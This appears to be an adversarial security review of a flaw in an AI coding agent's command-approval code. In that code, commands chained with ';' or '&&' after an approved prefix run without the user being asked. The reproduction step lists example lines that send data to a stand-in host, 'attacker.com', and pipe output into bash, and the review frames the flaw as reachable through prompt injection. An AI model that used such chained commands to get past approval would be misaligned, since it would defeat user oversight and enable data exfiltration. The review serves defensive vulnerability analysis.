# Adversarial Review: bash-pipe-semicolon-bypass

## Reviewer Assessment

### Step 1 - Claim Decomposition

**Restated claim**: The agent command approval system's `extractBashPrefix` function only splits bash commands on the pipe character `|` when determining the command prefix for allowlist matching. It ignores shell metacharacters `;`, `&&`, and `||`. This allows an LLM to append arbitrary commands after these separators, and the compound command will be auto-approved based solely on the first segment matching a previously-approved prefix. The full unsanitized command is then passed to `bash -c` for execution.

**Sub-claims**:
- A: LLM controls the full command string -- SUPPORTED (bash tool accepts arbitrary command string)
- B: `extractBashPrefix` only splits on `|`, ignoring `;`, `&&`, `||` -- CONFIRMED by code at approval.go:205-207
- C: Full command executes via `bash -c` -- CONFIRMED at bash.go:64

### Step 2 - Code Path Trace

Complete path traced independently:
1. `run.go:376-378`: `IsDenied()` checks full command against deny patterns -- gaps exist for `tee`, `curl` GET, `| bash`
2. `run.go:404`: `approval.IsAllowed()` calls `extractBashPrefix()` 
3. `approval.go:205-207`: `strings.Split(command, "|")` only splits on pipe; first segment extracted
4. `approval.go:215-284`: First segment checked against `safeCommands` map and path extracted
5. `approval.go:403-406`: Extracted prefix matched against stored prefixes
6. If match found, `IsAllowed` returns true, no user prompt shown
7. `bash.go:64`: `exec.CommandContext(ctx, "bash", "-c", command)` executes FULL command

Notable: `isCommandOutsideCwd` (line 314-374) DOES split on `|`, `;`, `&` but is only used for warning display during `RequestApproval` -- which is skipped when `IsAllowed` returns true.

### Step 3 - Protection Surface

| Layer | Protection | Blocks Attack? |
|-------|-----------|---------------|
| IsDenied | Deny patterns on full command | Partial -- misses `tee`, `curl` GET, `\| bash`, `\| sh`, `\| python3` |
| extractBashPrefix | Pipe splitting | Only splits `\|`, ignores `;` `&&` `\|\|` |
| isCommandOutsideCwd | Path checking across separators | Warning-only, not enforcement |
| safeCommands | Allowlist for base commands | Only checks first pipe segment |
| Path traversal checks | Rejects `..` and absolute paths | Only in first segment |

### Step 4 - Reproduction

Code-level reproduction confirmed: independent reimplementation of `extractBashPrefix` produces identical prefix `"cat:tools/"` for:
- `cat tools/main.go` (benign)
- `cat tools/main.go | tee /tmp/proof` (file write)
- `cat tools/main.go | bash` (code execution)  
- `cat tools/main.go; curl http://attacker.com/?d=x` (exfiltration)
- `cat tools/main.go && curl http://attacker.com/?d=x` (exfiltration)

Full environment reproduction blocked: requires interactive terminal session with LLM.

### Step 5 - Briefs

**Prosecution**: The vulnerability is confirmed by code analysis and functional testing. The `extractBashPrefix` function provably returns the same prefix for benign and malicious commands. `IsDenied` has gaps for key attack vectors (`tee`, `| bash`, `curl` GET). The `isCommandOutsideCwd` function proves developer awareness of shell metacharacters but was only used for warnings.

**Defense**: Requires preconditions (user must approve a command for session, LLM must be manipulated). `IsDenied` blocks some dangerous patterns. GET exfiltration is bandwidth-limited. No full environment reproduction.

### Step 6 - Severity

Starting at MEDIUM. Upgraded to HIGH: remotely triggerable via prompt injection, meaningful trust boundary crossing (user approval scope), but requires precondition of user having approved a benign command. Not CRITICAL because it requires active agent session and prior user approval.

Original: CRITICAL. Challenged: HIGH. Lower wins: HIGH.

## Verdict

```
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: extractBashPrefix provably returns identical prefix for benign and malicious pipe/semicolon-augmented commands; IsDenied gaps allow tee, curl GET, and piped bash execution
Severity-Final: HIGH
PoC-Status: theoretical
```
